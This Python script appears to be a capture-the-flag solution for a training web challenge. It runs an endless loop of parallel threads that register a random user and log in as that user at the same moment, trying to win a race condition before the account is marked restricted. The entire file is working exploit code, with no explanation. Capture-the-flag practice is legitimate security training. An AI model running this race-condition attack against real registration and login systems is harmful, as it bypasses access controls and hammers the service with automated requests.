import requests
import random
import time
from threading import Thread
import uuid

URL= "http://aart.training.jinblack.it"


def registration(u,p):
	url= "%s/register.php" % (URL,)
	payload={"username":u, "password":p} 
	r=requests.post(url,data=payload)

def login(u,p):
	url= "%s/login.php" % (URL,)
	payload={"username":u, "password":p} 
	r=requests.post(url,data=payload)
	if "This is a restricted account" not in r.text:
		print(r.text)



while True:
	u=uuid.uuid4()
	p=u
	print("request")
	t_reg=Thread(target=registration,args=[u,p])
	t_log=Thread(target=login,args=[u,p])
	t_reg.start()
	t_log.start()
	time.sleep(0.1)
